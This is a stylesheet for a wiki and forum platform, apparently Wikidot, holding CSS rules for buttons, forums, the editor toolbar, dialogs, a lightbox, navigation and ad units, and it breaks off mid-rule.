	background-color: #F4F4F4;
	border: 1px solid #AAA;
	color: #000;
}
div.buttons input:hover, input.button:hover, button:hover,  a.button:hover{
	background-color: #DDD;
	color: #000;
}

input.button.disabled, div.buttons input.disabled{
	background-color: #F7F7F7;
	color: #BBB;
}
input.button.disabled:hover, div.buttons input.disabled:hover{
	background-color: #F7F7F7;
	color: #BBB;
}


input.checkbox{
	background-color: #FFF;
	color: #000;
}

input.text{
	border: 1px solid #777;
	margin: 0 1px;
	padding: 1px 2px;
	background-color: #FFF;
	color: #000;
}

input.text.invalid{
	border-color: red;
}

textarea{
	font-family: verdana,arial,helvetica,sans-serif;
	padding: 2px;
	font-size: 100%;
	border: 1px solid #777;
	background-color: #FFF;
	color: #000;
}

div.note{
	font-size: 90%;
	margin: 1em; padding: 0 1em;
	border: 1px solid #EEE;
	background-color: #F4F4F4;
}

div.note-block{
	padding: 0 1em;margin: 0.5em 0 ;
	border: 1px solid #EAA;
}



div.sites-list {}

div.site-list-item {
	margin: 0.5em 0;
	padding: 0.3em;
}

div.site-list-item:hover{
	background-color: #F6F6F6;
}

div.site-list-item .name{
	font-size: 120%;
	font-weight: bold;
}
div.site-list-item .subtitle{
}	
div.site-list-item .description{
	font-style: italic;
	padding-left: 2em;
}

div.site-list-item .options {


	float: right;
	margin-right: 100px;
}

.search-highlight{
	background-color: yellow;
}


.self-ads{
	width: 700px;
	margin: 1em auto;padding: 10px 10px;
	border: 1px solid #888;

}
.self-ads .title{
	font-size: 1.5em;
	padding-bottom: 5px;
}
.self-ads .image{
	float: right;
	padding-left: 1em;
}

div.wd-adunit {
  text-align: center;
  margin: 20px auto;
}

div.wd-adunit-side_slide {
    position: fixed;
    right: 10px;
    width: 160px;
    z-index: 990;
}

div.wd-adunit-mobile_anchor {
    position: fixed;
    left: 0;
    width:320px;
    height:60px;
    bottom: 0;
    z-index: 990;
    transform-origin: 0 60px 0;
    margin: 0;
    padding: 0;
    background-color: #000;
}

div.bsa_linkbox {
	margin: 0 auto;
}

iframe[id^=revmob-ad-] {
	position: fixed !important;
	max-width: 100% !important;
	min-width: 100% !important;
}

#house-ad-1 {
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
	background: #FFF;
    color: #222;
    text-align: center;
    border: 1px solid #CCC;
    padding: 10px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
}

#house-ad-1 .close {
	float: right;
    font-size: 16px;
    padding: 5px;
    display: block;
    color: #FFF;
    background: #CCC;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    text-decoration: none;
}

#house-ad-1 .close:hover {
	text-decoration: none;
	background: #555;
}

#house-ad-1 p {
    font-size: 16px;
    padding: 0;
    margin: 5px;
    font-weight: 200;
}

#house-ad-1 .button-wrap {
	padding: 20px 0px 15px 0px;
}

#house-ad-1 .button-wrap a {
	font-size: 14px;
    color:#ffffff;
    background-color:#f0ad4e;
    border-color:#eea236;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    padding: 10px;
    text-decoration: none;
}

#house-ad-1 .button-wrap a:hover {
    color:#ffffff;
    background-color:#ed9c28;
    border-color:#d58512;
    text-decoration: none;
}

.hubzo-ad {
	text-align: center;
	font-size: 20px;
	line-height: 23px;
}

.hubzo-ad .link a {
	font-size: 13px;
	color: #4A4;
}

.hubzo-ad .network {
	font-size: 10px;
	opacity: 0.5;
}

.ext-au {
	overflow: hidden;
	max-width: 400px;
	text-align: left;
	margin: 0 auto;
	cursor: pointer;
}

.ext-au img.image {
	height: 68px;
	float: left;
}

.ext-au .title {
	margin-left: 80px;
	font-weight: bold;
	font-size: 110%;
}
.ext-au .description {
	margin-left: 80px;
	padding: 5px 0;
	opacity: 0.8;
}
.ext-au .link {
	margin-left: 80px;
}




.rss-icon{
	
	
	vertical-align: -10%;
}




#side-bar div.foldable-list-container ul li ul li{
	font-size: 90%;
}


#login-iframe{
	height: 24em;
}








.yui-navset .yui-nav li,
.yui-navset .yui-navset-top .yui-nav li,
.yui-navset .yui-navset-bottom .yui-nav li {
    margin:0 0.5em 0 0; 
}
.yui-navset-left .yui-nav li,
.yui-navset-right .yui-nav li {
    margin:0 0 0.5em; 
}


.yui-navset .yui-navset-left .yui-nav,
.yui-navset .yui-navset-right .yui-nav,
.yui-navset-left .yui-nav,
.yui-navset-right .yui-nav { width:6em; }

.yui-navset-top .yui-nav,
.yui-navset-bottom .yui-nav {
    width:auto;
}
.yui-navset .yui-navset-left,
.yui-navset-left { padding:0 0 0 6em; } 
.yui-navset-right { padding:0 6em 0 0; } 

.yui-navset-top,
.yui-navset-bottom {
    padding:auto;
}


.yui-nav,
.yui-nav li {
    margin:0;
    padding:0;
    list-style:none;
}
.yui-navset .yui-nav li em { font-style:normal; }

.yui-navset {
    position:relative; 
    zoom:1;
}

.yui-navset .yui-content { zoom:1; }

.yui-navset .yui-nav li,
.yui-navset .yui-navset-top .yui-nav li, 
.yui-navset .yui-navset-bottom .yui-nav li {
    display:inline-block;
    display:-moz-inline-stack;
    *display:inline; 
    vertical-align:bottom; 
    cursor:pointer; 
    zoom:1; 
}

.yui-navset-left .yui-nav li,
.yui-navset-right .yui-nav li {
    display:block;
}

.yui-navset .yui-nav a { position:relative; } 

.yui-navset .yui-nav li a,
.yui-navset-top .yui-nav li a,
.yui-navset-bottom .yui-nav li a {
    display:block;
    display:inline-block;
    vertical-align:bottom; 
    zoom:1;
}

.yui-navset-left .yui-nav li a,
.yui-navset-right .yui-nav li a {
    display:block;
}

.yui-navset-bottom .yui-nav li a {
    vertical-align:text-top; 
}

.yui-navset .yui-nav li a em,
.yui-navset-top .yui-nav li a em,
.yui-navset-bottom .yui-nav li a em { display:block; }


.yui-navset .yui-navset-left .yui-nav,
.yui-navset .yui-navset-right .yui-nav,
.yui-navset-left .yui-nav,
.yui-navset-right .yui-nav {
   position:absolute;
   z-index:1; 
}

.yui-navset-top .yui-nav,
.yui-navset-bottom .yui-nav {
    position:static;
}
.yui-navset .yui-navset-left .yui-nav,
.yui-navset-left .yui-nav { left:0; right:auto; }

.yui-navset .yui-navset-right .yui-nav,
.yui-navset-right .yui-nav { right:0; left:auto; }




.yui-navset .yui-nav,
.yui-navset .yui-navset-top .yui-nav { 
    border:solid #2647a0; 
    border-width:0 0 5px;
    Xposition:relative;
    zoom:1;
}

.yui-navset .yui-nav li,
.yui-navset .yui-navset-top .yui-nav li {
    margin:0 0.16em 0 0; 
    padding:1px 0 0; 
    zoom:1;
}

.yui-navset .yui-nav .selected,
.yui-navset .yui-navset-top .yui-nav .selected { 
    margin:0 0.16em -1px 0; 
}

.yui-navset .yui-nav a,
.yui-navset .yui-navset-top .yui-nav a {
    background:#d8d8d8 url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--javascript/yahooui/assets/sprite.png") repeat-x; 
    border:solid #a3a3a3;
    border-width:0 1px;
    color:#000;
    position:relative;
    text-decoration:none;
}

.yui-navset .yui-nav a em,
.yui-navset .yui-navset-top .yui-nav a em {
    border:solid #a3a3a3;
    border-width:1px 0 0;
    cursor:hand;
    padding:0.25em .75em;
    left:0; right: 0; bottom: 0; 
    top:-1px; 
    position:relative;
}

.yui-navset .yui-nav .selected a,
.yui-navset .yui-nav .selected a:focus, 
.yui-navset .yui-nav .selected a:hover { 
    background:#2647a0 url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--javascript/yahooui/assets/sprite.png") repeat-x left -1400px; 
    color:#fff;
}

.yui-navset .yui-nav a:hover,
.yui-navset .yui-nav a:focus {
    background:#bfdaff url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--javascript/yahooui/assets/sprite.png") repeat-x left -1300px; 
    outline:0;
}

.yui-navset .yui-nav .selected a em {
    padding:0.35em 0.75em; 
}

.yui-navset .yui-nav .selected a,
.yui-navset .yui-nav .selected a em {
    border-color:#243356; 
}

.yui-navset .yui-content {
    background:#f4f5ff; 
}

.yui-navset .yui-content,
.yui-navset .yui-navset-top .yui-content {
    border:1px solid #808080; 
    border-top-color:#243356; 
    padding:0.25em 0.5em; 
}


.yui-navset-left .yui-nav,
.yui-navset .yui-navset-left .yui-nav,
.yui-navset .yui-navset-right .yui-nav,
.yui-navset-right .yui-nav {
    border-width:0 5px 0 0;
    Xposition:absolute; 
    top:0; bottom:0; 
}

.yui-navset .yui-navset-right .yui-nav,
.yui-navset-right .yui-nav {
    border-width:0 0 0 5px;
}

.yui-navset-left .yui-nav li,
.yui-navset .yui-navset-left .yui-nav li,
.yui-navset-right .yui-nav li {
    margin:0 0 0.16em; 
    padding:0 0 0 1px; 
}

.yui-navset-right .yui-nav li {
    padding:0 1px 0 0; 
}

.yui-navset-left .yui-nav .selected,
.yui-navset .yui-navset-left .yui-nav .selected { 
    margin:0 -1px 0.16em 0;
}

.yui-navset-right .yui-nav .selected { 
    margin:0 0 0.16em -1px;
}

.yui-navset-left .yui-nav a,
.yui-navset-right .yui-nav a {
    border-width:1px 0;
}

.yui-navset-left .yui-nav a em,
.yui-navset .yui-navset-left .yui-nav a em,
.yui-navset-right .yui-nav a em {
    border-width:0 0 0 1px;
    padding:0.2em .75em;
    top:auto;
    left:-1px; 
}

.yui-navset-right .yui-nav a em {
    border-width:0 1px 0 0;
    left:auto;
    right:-1px; 
}

.yui-navset-left .yui-nav a,
.yui-navset-left .yui-nav .selected a,
.yui-navset-left .yui-nav a:hover,
.yui-navset-right .yui-nav a,
.yui-navset-right .yui-nav .selected a,
.yui-navset-right .yui-nav a:hover,
.yui-navset-bottom .yui-nav a,
.yui-navset-bottom .yui-nav .selected a,
.yui-navset-bottom .yui-nav a:hover {
    background-image:none; 
}

.yui-navset-left .yui-content {
    border:1px solid #808080; 
    border-left-color:#243356; 
}


.yui-navset-bottom .yui-nav,
.yui-navset .yui-navset-bottom .yui-nav {
    border-width:5px 0 0; 
}

.yui-navset .yui-navset-bottom .yui-nav .selected,
.yui-navset-bottom .yui-nav .selected { 
    margin:-1px 0.16em 0 0; 
}

.yui-navset .yui-navset-bottom .yui-nav li,
.yui-navset-bottom .yui-nav li { 
    padding:0 0 1px 0; 
    vertical-align:top;
}

.yui-navset .yui-navset-bottom .yui-nav li a,
.yui-navset-bottom .yui-nav li a { 
}

.yui-navset .yui-navset-bottom .yui-nav a em,
.yui-navset-bottom .yui-nav a em {
    border-width:0 0 1px;
    top:auto;
    bottom:-1px; 
}

.yui-navset-bottom .yui-content,
.yui-navset .yui-navset-bottom .yui-content {
    border:1px solid #808080; 
    border-bottom-color:#243356; 
}




.hl-default {
    color: #000;
}
.hl-code {
    color: #000;
}
.hl-brackets {
    color: #000;
}
.hl-comment {
    color: #494;
}
.hl-quotes {
    color: #009;
}
.hl-string {
    color: #009;
}
.hl-identifier {
    color: #000;
}
.hl-builtin {
    color: Teal;
}
.hl-reserved {
    color: #55D;
}
.hl-inlinedoc {
    color: Blue;
}
.hl-var {
    color: #494;
}
.hl-url {
    color: Blue;
}
.hl-special {
    color: Navy;
	font-weight: bold;
}
.hl-number {
    color: Maroon;
}
.hl-inlinetags {
    color: #949;
	font-weight: bold;
}
.hl-main { 
   
}
.hl-gutter {
    background-color: #999999;
    color: White
}
.hl-table {
  
}



.autocomplete-container{
	position:relative;
	width:100%;
	margin:0;
	
}
.autocomplete-input{
	position:relative;
	width:100%;

	display:block;
}

.autocomplete-list{
	text-align: left;
	padding: 0;
	position:absolute;
	left:0px;
	width: 100%;
	
	
	overflow:hidden;

	z-index: 100;
}

.yui-ac-content{
	border:1px solid #404040;
	background:#fff;
}

.autocomplete-list ul{
	
	margin:0;
	width:100%;
	padding:2px 0;
	list-style:none;
}
.autocomplete-list li{
	padding:0 0.5em;
	cursor:default;
	white-space:nowrap;
	
}
.autocomplete-list li.yui-ac-highlight {
	background-color: #DDD;
}



.forum-breadcrumbs{
	margin-top: -0.7em;
}
.forum-breadcrumbs a{

}

.forum-group{
	margin: 0.5em 0;
}

.forum-group div.head{
	background-color: #666;
	color: #FFF;
	padding: 0.5em 1em;
	margin: 0;
	border: 1px solid #333;
}

.forum-group div.head .title{
	font-weight: bold;
}

.forum-group table{
	width: 100%;
	border-collapse: separate;
	border-spacing: 1px;
}
.forum-group  table td{
	border: 1px solid #DDD;
	padding: 2px 10px;
}

.forum-group  table td.name .description{
	color: #777;
	font-size: 87%;
}
.forum-group  table td.name .title{
	font-weight: bold;
}

.forum-group  table td.last{
	width: 17em;
	font-size: 85%;
	text-align: center;
}
.forum-group  table td.posts{
	width: 5em;
	text-align: center;
}
.forum-group  table td.threads{
	width: 5em;
	text-align: center;
}


.forum-group table tr.head td{
	text-align: center;
	font-size: 85%;
	background-color: #EEE;
}






.forum-category-box{
	margin: 0.5em 0;
}

.forum-category-box  .description-block{
	border: 1px solid #CCC;
	margin: 1em 4em;
	padding: 0.5em;
	background-color: #F5F5F5;
	height: 100%;
	overflow: hidden;
}


.forum-category-box  .description-block .statistics{
	padding: 0 0.5em;
	font-size: 85%;
	color: #666;
	text-align: right;
	float: right;
}

.forum-category-box .options{
	text-align: right;
	margin: 1em 4em;
}

.forum-category-box table{
	width: 100%;
	
	border-collapse: separate;
	border-spacing: 1px;
	border: 1px solid #BBB;
	margin: 10px 0; padding:0;
}

.forum-category-box table td{
	border: 1px solid #DDD;
	padding: 5px 10px;
}
.forum-category-box table tr.head td{
	text-align: center;
	font-size: 90%;
	background-color: #EEE;
}

.forum-category-box  table td.name .description{
	color: #777;
	font-size: 87%;
}
.forum-category-box table td.name .title{
	font-weight: bold;
}

.forum-category-box  table td.last{
	width: 16em;
	font-size: 87%;
	text-align: center;
}
.forum-category-box table td.posts{
	width: 5em;
	text-align: center;
}
.forum-category-box table td.started{
	width: 17em;
	text-align: center;
	font-size: 87%;
}

.forum-category-box .pager{
	margin: 1em 0;
	text-align: center;
}



.forum-new-thread-box  .description{
	border: 1px solid #CCC;
	margin: 1em 4em;
	padding: 0.5em;
	background-color: #F5F5F5;
	overflow: auto;
}


.forum-new-thread-box  .description .statistics{
	padding: 0 0.5em;
	font-size: 87%;
	color: #666;
	text-align: right;
	float: right;
}




.forum-thread-box{
	margin: 0.5em 0;
	
}

.forum-thread-box  .description-block{
	border: 1px solid #CCC;
	margin: 1em 4em;
	padding: 0.5em;
	background-color: #F5F5F5;
	overflow: hidden;
	height: 100%;
}

.forum-thread-box  .description-block .head{
	color: #777;
	font-size: 87%;
}

.forum-thread-box  .description-block .statistics{
	margin: 0.5em 0;
	padding: 0 0.5em;
	font-size: 87%;
	color: #666;
	text-align: right;
	float: right;
}

.forum-thread-box .options{
	text-align: right;
	margin: 0.2em 4em;
}

.forum-thread-box  .action-area{
	margin: 1em 4em; padding: 0.5em 1em;
	border: 1px solid #EEE;

}

.thread-container .post{
	padding: 10px 0 10px 0;
	width: 99%; 
}

.thread-container .post .options a{
	margin:0; padding:0;
	color: #77A;
}

.thread-container .post .head{
	padding: 0.2em 0.5em;
	background-color: #EEE;
}
.thread-container .post  .long  .head .options{
	float: right;	
	margin:0; padding: 0;
}

.thread-container .post  .long  .head .title{
	font-weight: bold;
	font-size: 1.2em;
}

.thread-container .post  .long  .head .info{
}

.thread-container .post  .long  .content{}

.thread-container .post  .long  .content p{
	
}

.thread-container .post  .long  .changes{
	font-size: 85%;
	color: #777;
	text-align: right;
	margin-bottom: 4px;
}
.thread-container .post  .long  .changes a {
	color: #77A;
}

.thread-container .post  .long  .revisions {
	text-align: right;
	padding: 0.5em;
	font-size: 90%;
}

.thread-container .post  .long  .revisions  .title{
	font-weight: bold;
	font-size: 110%;
	padding-bottom: 0.3em;
}

.thread-container .post  .long  .revisions table {
	margin: 0 0 0 auto;
	font-size: 90%;
}

.thread-container .post  .long  .revisions table tr.active td{
	background-color: #EEE;
}

.thread-container .post  .long  .options{
	text-align: right;
	margin: 0; padding: 0;
	height: 1%;
}

.thread-container .post  .short{ display: none;
	background-color: #F4F4F4;
	padding: 0.2em 0.5em;
}

.thread-container .post  .short  .options{
	color: #77A;
	float: right;
	margin:0; padding:0;
}	

.thread-container .post .signature {
	font-size: 85%;	
}
.thread-container .post .signature hr.signature-separator {
	margin: 2px auto 2px 0;
	padding: 0;
	width: 15em;	
}


.thread-container .post.folded   .long{ display: none;}
.thread-container .post.folded   .short{ display: block;}



.post-container .post-container{
	margin-left: 5%;
}

.post-container.fordelete{
	border: 2px solid #E44;
	padding: 0.5em;
}

div.new-post{
	text-align: left;
	margin: 20px 0;
}
div.new-post a{
	border: 1px solid #999;
	background-color: #F7F7F7;
	padding: 5px 10px;
	font-size: 100%;
	font-weight: bold;
}




.forum-recent-posts-box .pager{
	margin: 1em 0;
	text-align: center;
}



.forum-mini-stat{
	margin: 0.5em 0;
}

.forum-mini-stat .item .info{
	color: #777;
	font-size: 80%;	
}



.wd-editor-toolbar-panel{
}

.wd-editor-toolbar-panel div{
	height: 30px;
}

.wd-editor-toolbar-panel a{
	margin: 0;
	
	border: 1px transparent;
	
	background-color: #FFF;
}
.wd-editor-toolbar-panel a:hover{
	
	border-color: #333;
}

.wd-editor-toolbar-panel ul{
	padding: 0; margin: 0;

	float: left;
	list-style: none;
}	
.wd-editor-toolbar-panel ul li{
	padding: 0; margin: 1px;
	float: left;

}
.wd-editor-toolbar-panel ul li ul {
	position: absolute;
	
	
	left: -999em;

	z-index: 30;
}

.wd-editor-toolbar-panel ul li ul li a{
	float: none;
	
}
.wd-editor-toolbar-panel ul li ul li{
	margin: 0;
}
.wd-editor-toolbar-panel ul li ul li a{
	display: block;
	float: none;
}

.wd-editor-toolbar-panel ul li:hover ul, .wd-editor-toolbar-panel ul li.sfhover ul {
	left: auto;
	background-color: black;
	border: 2px solid #555;
}

.wd-editor-toolbar-panel li.hseparator{
	width: 2px;
	height: 28px;
	margin: 0 5px;
	background-color: #333;
}

.wd-editor-toolbar-panel ul li a{
	height: 22px;
	width: 22px;
	padding: 0; margin: 0;
	display: block;

}

.wd-editor-toolbar-panel ul li a span{
	display: none;
}

.wd-editor-toolbar-panel a {
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/editor/icons1.png");
}

.wd-editor-toolbar-panel a:hover {
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/editor/icons3.png");
}


a.weditor-bold{
	background-position: -132px 0;
}
a.weditor-italic{
	background-position: -154px 0;
}
a.weditor-underline{
	background-position: -176px 0;
}
a.weditor-strikethrough{
	background-position: -198px 0;
}
a.weditor-teletype{
	background-position: -220px 0;
}	
a.weditor-quote{
	background-position: -242px 0;
}	
a.weditor-superscript{
	background-position: -264px 0;
}
a.weditor-subscript{
	background-position: -286px 0;
}	
a.weditor-raw{
	background-position: -308px 0;
}
a.weditor-hr{
	background-position: -330px 0;
}
a.weditor-div{
	background-position: -352px 0;
}
a.weditor-clearfloat{
	background-position: -374px 0;
}
a.weditor-clearfloatleft{
	background-position: -396px 0;
}
a.weditor-clearfloatright{
	background-position: -418px 0;
}
a.weditor-divwiz{
	background-position: -440px 0;
}
a.weditor-table{
	background-position: -440px 0;
}
a.weditor-toc{
	background-position: -462px 0;
}
a.weditor-uri{
	background-position: -484px 0;
}
a.weditor-uriwiz{
	background-position: -506px 0;
}
a.weditor-pagelink{
	background-position: -528px 0;
}
a.weditor-pagelinkwiz{
	background-position: -550px 0;
}
a.weditor-image{
	background-position: -572px 0;
}
a.weditor-imagewiz{
	background-position: -594px 0;
}
a.weditor-video{
	background-position: -616px 0;
}
a.weditor-audio{
	background-position: -638px 0;
}
a.weditor-code{
	background-position: -660px 0;
}
a.weditor-codewiz{
	background-position: -682px 0;
}
a.weditor-numlist{
	background-position: -704px 0;
}
a.weditor-bullist{
	background-position: -726px 0;
}
a.weditor-incindent{
	background-position: -748px 0;
}
a.weditor-decindent{
	background-position: -770px 0;
}
a.weditor-deflist{
	background-position: -792px 0;
}
a.weditor-footnote{
	background-position: -814px 0;
}
a.weditor-math{
	background-position: -836px 0;
}
a.weditor-mathinline{
	background-position: -858px 0;
}
a.weditor-eqref{
	background-position: -880px 0;
}
a.weditor-bib{
	background-position: -902px 0;
}
a.weditor-bibcite{
	background-position: -924px 0;
}
a.weditor-h1{
	background-position: 0px 0;
}
a.weditor-h2{
	background-position: -22px 0;
}
a.weditor-h3{
	background-position: -44px 0;
}
a.weditor-h4{
	background-position: -66px 0;
}
a.weditor-h5{
	background-position: -88px 0;
}
a.weditor-h6{
	background-position: -110px 0;
}

a.weditor-html{
  background-position: -946px 0;
}


.odialog-shader, .odialog-shader-iframe {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 40;
}

.odialog-shader {
    background-color: #222;
    filter: alpha(opacity=80);
    opacity: 0.8;
}

.odialog-shader-iframe {
    filter: alpha(opacity=0);
    opacity: 0;
}

table#odialog-box-container{
	position: absolute;
	width: 100%;
	margin: 0;
	left: 0;
}
table#odialog-box-container td{
	width: 100%; height: 100%;
	text-align: center;
	vertical-align: middle;
	
}

table#odialog-box-container td div{
	margin: 0 auto;
}

#odialog-wrapper{
	text-align: center;
}

#odialog-container{

	position: absolute;
	top:0;
	height: 100%;
	z-index: 50;
	width: 100%;
}


.owindow{
	background-color: white;
	width: 50em;
	border: 2px solid #BBB;
	text-align: left;
	position: absolute;
}

.owindow .close{
	float: right;
	padding: 0.2em 0.4em;
	font-size: 85%;
	cursor: pointer; cursor: hand;
}

.owindow .title{
	cursor: move;
	font-size: 120%;
	font-weight: bold;
	padding: 0.2em 1em;
	background-color: #F5F5F5;
	height: 1%;
}

.owindow .content{
	padding: 0.5em 1em;
	
}

.owindow .button-bar{
	text-align: right;
	padding: 0.2em 1em;
	margin: 0.5em;
}

.owindow .button-bar input{
	padding: 0 0.5em;
}

.owindow .button-bar a{
	margin: 0.2em 0.2em;
	padding: 0.1em 1em;
	text-decoration: none;
	background-color: #F4F4F4;
	border: 1px solid #AAA;
}
.owindow .button-bar a:hover{
	background-color: #DDD;
}




.owindow.owait {
	width: auto;
}
.owindow.owait .content{
	
	margin: 10px;
	padding: 0 50px 20px 50px;
	background-repeat: no-repeat;
	background-position: bottom center;
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/progress/progressbar.gif");
}
.owindow.osuccess {
	width: auto;
}
.owindow.osuccess .content{
	margin: 10px;
	padding: 0 50px;
}

.box444{
	background-color: white;
	width: 40%;
	top: 10px; left: 10px;
}

.box444 .button-bar{
	background-color: #DDD;
	text-align: right;
	padding: 0.3em 1em;
}

.hovertip{
	display: none; 
	width: 20em; 
	border: 2px solid #888;
	background-color: #F3F3F3;
	z-index: 100;
}

.hovertip .title{
	font-weight: bold;
	padding: 0.2em 0.5em;
	font-size: 110%;
}

.hovertip .content{
	padding: 0.2em 0.5em;
}




#jquery-overlay {
	position: absolute;
	top: 0;
	left: 0;
	z-index: 90;
	width: 100%;
	height: 500px;
}

#jquery-lightbox {
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	z-index: 100;
	text-align: center;
	line-height: 0;
}

#jquery-lightbox a img { border: none; }

#lightbox-container-image-box {
	position: relative;
	background-color: #fff;
	width: 250px;
	height: 250px;
	margin: 0 auto;
}

#lightbox-container-image { padding: 10px; }

#lightbox-loading {
	position: absolute;
	top: 40%;
	left: 0%;
	height: 25%;
	width: 100%;
	text-align: center;
	line-height: 0;
}

#lightbox-nav {
	position: absolute;
	top: 0;
	left: 0;
	height: 100%;
	width: 100%;
	z-index: 10;
}

#lightbox-container-image-box > #lightbox-nav { left: 0; }

#lightbox-nav a { outline: none;}

#lightbox-nav-btnPrev, #lightbox-nav-btnNext {
	width: 49%;
	height: 100%;
	zoom: 1;
	display: block;
}

#lightbox-nav-btnPrev { 
	left: 0; 
	float: left;
}

#lightbox-nav-btnNext { 
	right: 0; 
	float: right;
}

#lightbox-container-image-data-box {
	font: 10px Verdana, Helvetica, sans-serif;
	background-color: #fff;
	margin: 0 auto;
	line-height: 1.4em;
	overflow: auto;
	width: 100%;
	padding: 0 10px 0;
}

#lightbox-container-image-data {
	padding: 0 10px; 
	color: #666; 
}

#lightbox-container-image-data #lightbox-image-details { 
	width: 70%; 
	float: left; 
	text-align: left; 
}	

#lightbox-image-details-caption { font-weight: bold; }

#lightbox-image-details-currentNumber {
	display: block; 
	clear: left; 
	padding-bottom: 1.0em;	
}			

#lightbox-secNav-btnClose {
	width: 66px; 
	float: right;
	padding-bottom: 0.7em;	
}



#navi-bar-shadow {
	height: 25px;
	
	_display: none;
}

#navi-bar {
	font-size: 12px;
	font-family: verdana, arial, helvetica;
	height: 24px;
	background-color: #CCC;
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/shade2_n.png");
	background-position: bottom;
	border-bottom: 1px solid #444;
	color: #000;
	position:fixed;
    top:0px;
    width:100%;
    z-index:9999;
    overflow:hidden;
}

#navi-bar a {
	color: #119;
	background: transparent;
	padding:0; margin:0;
	text-decoration: none;
}

#navi-bar a:hover {
	background-color: transparent;
	text-decoration: none;
}

#navi-bar a.logo {
	position: absolute;
	left: 13px;
	top: 2px;
	width: 71px;
	height: 20px;
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--images/navibar/logo20.png");
	filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(enabled='true', sizingMethod='scale', src='../../../common--images/navibar/logo20.png');
	z-index: 999;
}

#navi-bar a.logo span {
	display: none;
}

#navi-bar .new-site {
	position: absolute;
	left: 120px;
	top: 3px;
}

#navi-bar .new-site input.text{
	width: 120px;
	text-align: center;
}

#navi-bar .new-site input.empty{
	color: #666;
}

#navi-bar .share {
	position: absolute;
	left: 370px;
	top: 4px;
}

#navi-bar .share span {
	vertical-align: 3px;
}

#navi-bar .share img {
	width: 16px;
	height: 16px;
}

#navi-bar .action-buttons {
	display: block;
	position: absolute;
	top: 2px;
	right: 120px;
	height: 14px;
	padding: 2px;
	color: #000;
}

#navi-bar .action-buttons a {
	padding: 0 3px;
	color: #000;
}

#navi-bar .join {
	display: block;
	position: absolute;
	left: 570px;
	top: 4px;
	color: #000;
	font-weight: bold;
}

#navi-bar .random-site {
	display: block;
	position: absolute;
	top: 2px;
	right: 50px;
	height: 14px;
	padding: 2px;
	
	color: #000;
}

#navi-bar .random-site:hover {
	border-color: #000;
}

#navi-bar .close {
	position: absolute;
	right: 5px;
	top: 5px;
}



#footer-bar {
	max-width: 750px;
	margin: 10px auto 0;
	padding-top: 10px;
	overflow: hidden;
	border-top: 1px solid #AAA;
}

#footer-bar h2 {
	font-size: 130%;
	padding: 5px 0;
	margin: 0;
	text-align: center;
	font-weight: bold;
}

#footer-bar .units {
  overflow: hidden;
}

#footer-bar .unit {
	float: left;
	width: 185px;
}

#footer-bar .unit .inner {
	padding: 5px 10px;
	text-align: center;
}

#footer-bar .unit .image {
	display: block;
	height: 60px;
	overflow: hidden;
	text-decoration: none;
}

#footer-bar h3 {
	margin: 0; padding: 5px 0 3px;
	font-size: 100%;
	font-weight: bold;
}

#footer-bar a {
	text-decoration: none;
	background: transparent;
	opacity: 1;
}

#footer-bar a:hover {
	text-decoration: none;
	background: transparent;
}

#footer-bar .desc {
	font-size: 80%;
}

#footer-bar .close {
	float:right;
	margin: 5px;
}

#footer-bar .ads-here {
  text-align: center;
  padding: 5px;
}



.form-table .form-value {
    display: block;
}

.form-table .form-error {
    border: 1px dotted red;
}

.form-table .form-hinted {
    color: #666;
}

.form-table .form-message {
    color: green;
    display: block;
}


iframe.html-block-iframe {
    width: 100%;
    margin: 0;
    padding: 0;
    border: 0;
    height: 0;
    background: transparent;
}


#boonity_free_site_bottom {
    margin: 0 auto !important;
}




.awesome, .awesome:hover {
    background-color: #111;
    color: #fff;
}


.awesome        { padding: 5px 10px 6px; font-size: 13px; }
.awesome:active	{ padding: 6px 10px 5px; }


.awesome { 
    border: 0 !important; 
    cursor: pointer !important; 
    font-style: normal !important; 
    font-weight: bold !important; 
    line-height: 1 !important; 
    position: relative !important; 
    text-align: cente !important;
    text-decoration: none !important; 

    
    margin-top: 0 !important;
    margin-bottom: 0 !important;

    
    text-shadow: 0 -1px 1px rgba(0,0,0,0.25), -2px 0 1px rgba(0,0,0,0.25) !important; 

    border-radius: 6px; 
    -moz-border-radius: 6px;
    -webkit-border-radius: 6px;
    box-shadow: 0 1px 2px rgba(0,0,0,0.5);
    -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.5);
    -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.5);

    
    background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/cool-button-gradient.png");
    background-position: center center;
    background-repeat: repeat-x;

    
    background-image: linear-gradient(top, rgba(255,255,255,.2), rgba(150,150,150,.2), rgba(0,0,0,.0)) !important;
    background-image: -moz-linear-gradient(top, rgba(255,255,255,.2), rgba(150,150,150,.2), rgba(0,0,0,.0)) !important;
    background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(rgba(255,255,255,.2)), color-stop(0.5, rgba(150,150,150,.2)), to(rgba(0,0,0,.0))) !important;

    
    display: -moz-inline-stack;
    display: inline-block;
    vertical-align: middle !important;
    *display: inline !important;
    position: relative;

    
    -moz-user-select: none;
}


@media all and (-webkit-min-device-pixel-ratio:10000),not all and (-webkit-min-device-pixel-ratio:0) {
    input.awesome {
        border: 1px solid RGBa(0,0,0,0) !important;
    }
}


.awesome::selection {
    background: transparent;
}

.awesome {
    outline: 0; 
}
.awesome::-moz-focus-inner {
    border: none; 
}
.awesome:focus,
.awesome:hover {
